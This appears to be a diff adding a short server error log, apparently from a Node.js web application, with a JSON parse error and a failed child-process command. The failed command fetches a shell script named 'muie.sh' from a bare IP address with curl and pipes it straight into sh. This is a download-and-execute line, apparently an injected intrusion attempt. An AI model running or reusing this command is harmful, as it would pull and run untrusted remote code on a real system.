@@ -1,0 +1,16 @@
+ ⨯ SyntaxError: Bad escaped character in JSON at position 184 (line 7 column 55)
+    at JSON.parse (<anonymous>) {
+  digest: '1869737615'
+}
+The system cannot find the path specified.
+ ⨯ [Error: Command failed: curl http://195.24.237.224:9999/muie.sh | sh > /tmp/out_2353.txt
+The system cannot find the path specified.
+] {
+  status: 255,
+  signal: null,
+  output: [Array],
+  pid: 13408,
+  stdout: <Buffer >,
+  stderr: <Buffer 54 68 65 20 73 79 73 74 65 6d 20 63 61 6e 6e 6f 74 20 66 69 6e 64 20 74 68 65 20 70 61 74 68 20 73 70 65 63 69 66 69 65 64 2e 0d 0a>,
+  digest: '4081802265'
+}
